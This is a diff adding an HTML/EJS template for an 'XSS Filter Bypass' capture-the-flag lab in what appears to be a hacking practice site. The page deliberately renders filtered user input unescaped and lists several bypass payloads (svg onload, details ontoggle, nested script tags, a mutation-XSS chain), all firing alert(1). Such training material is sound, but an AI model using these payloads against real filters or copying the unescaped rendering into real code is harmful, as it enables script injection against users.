@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>XSS Filter Bypass - EliteHackLab</title>
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+</head>
+<body>
+  <div class="matrix-bg"></div>
+  <nav class="main-nav">
+    <div class="nav-brand"><span class="brand-icon">💀</span><span class="brand-text">Elite<span class="highlight">Hack</span>Lab</span></div>
+    <div class="nav-links"><a href="/"><i class="fas fa-home"></i> Dashboard</a><a href="/labs/xss"><i class="fas fa-flask"></i> XSS Labs</a></div>
+  </nav>
+  <div class="lab-container">
+    <div class="lab-header">
+      <div class="breadcrumb"><a href="/">Home</a> / <a href="/labs/xss">XSS</a> / Filter Bypass</div>
+      <h1>🎭 XSS Filter Bypass</h1>
+      <div class="lab-info">
+        <span class="lab-tag difficulty-hard">Hard</span>
+        <span class="lab-tag points"><i class="fas fa-star"></i> 10 pts</span>
+      </div>
+    </div>
+
+    <div class="lab-section">
+      <h2><i class="fas fa-crosshairs"></i> Objective</h2>
+      <p>The server applies a filter that removes &lt;script&gt; tags, javascript: protocol, and event handlers. Bypass the filter to execute JavaScript.</p>
+    </div>
+
+    <div class="lab-section">
+      <h2><i class="fas fa-terminal"></i> Filtered Input</h2>
+      <form method="GET" class="vulnerable-form">
+        <label>Input (filtered then rendered):</label>
+        <input type="text" name="input" value="<%= input %>" placeholder="Try to bypass the filter..." autocomplete="off">
+        <button type="submit"><i class="fas fa-paper-plane"></i> Submit</button>
+      </form>
+
+      <% if (filtered) { %>
+        <div class="result-box">
+          <p style="color:var(--text-secondary);">Filtered output:</p>
+          <div><%- filtered %></div>
+        </div>
+        <div class="hint-box">
+          <p><strong>Original:</strong> <%= input %></p>
+          <p><strong>After filter:</strong> <%= filtered %></p>
+        </div>
+      <% } %>
+
+      <div class="code-block">
+Filter rules applied:
+- Removes: &lt;script&gt; and &lt;/script&gt;
+- Removes: javascript:
+- Removes: on*= (event handlers)
+
+Bypass ideas:
+- &lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;  (double encoding)
+- &lt;img src=x oNeRrOr=alert(1)&gt;  (case won't work here)
+- &lt;svg/onload=alert(1)&gt;  (no space before event)
+- &lt;details open ontoggle=alert(1)&gt;  (different event)
+- &lt;math&gt;&lt;mtext&gt;&lt;/mtext&gt;&lt;mglyph&gt;&lt;svg&gt;&lt;mtext&gt;&lt;textarea&gt;&lt;path id="&lt;/textarea&gt;&lt;img src=x onerror=alert(1)//"&gt;
+      </div>
+    </div>
+
+    <div class="flag-submit">
+      <h3><i class="fas fa-flag"></i> Capture The Flag</h3>
+      <form onsubmit="submitFlagInline('xss-reflected', 'flagInput_xss_f', 'flagResult_xss_f'); return false;" style="display:flex; gap:0.5rem; max-width:500px; margin:0 auto;">
+        <input type="text" id="flagInput_xss_f" placeholder="FLAG{...}" autocomplete="off">
+        <button type="submit" class="btn">Submit</button>
+      </form>
+      <div id="flagResult_xss_f" style="display:none; margin-top:1rem;"></div>
+    </div>
+  </div>
+  <script src="/js/main.js"></script>
+</body>
+</html>
